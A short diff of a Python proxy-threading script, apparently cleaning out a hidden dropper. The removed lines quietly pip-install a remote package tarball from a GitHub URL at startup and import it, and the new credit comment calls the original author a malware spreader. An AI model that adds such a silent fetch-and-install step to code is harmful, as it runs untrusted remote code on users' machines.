@@ -1,16 +1,8 @@
 import os
 import sys
 import subprocess
-subprocess.call(["pip", "install", "requests", "pyaes"])
-
-package_url = "https://github.com/geethaab/PyWard/raw/main/pyward-3.0.tar.gz"
-
-
-subprocess.call(["pip", "install", package_url])
-
 
 import requests
-import pyward
 import threading
 
 max = threading.Semaphore(value=500) # Decrease this value if you encounter problems with your CPU/RAM usage.
@@ -60,4 +52,4 @@ for proxy in proxies:
     thread.start()
     print('Started new thread with proxy '+p)
 
-#Coded By Djxda
+#Coded By A Fucking Skid That Tried to Spread Malware <3
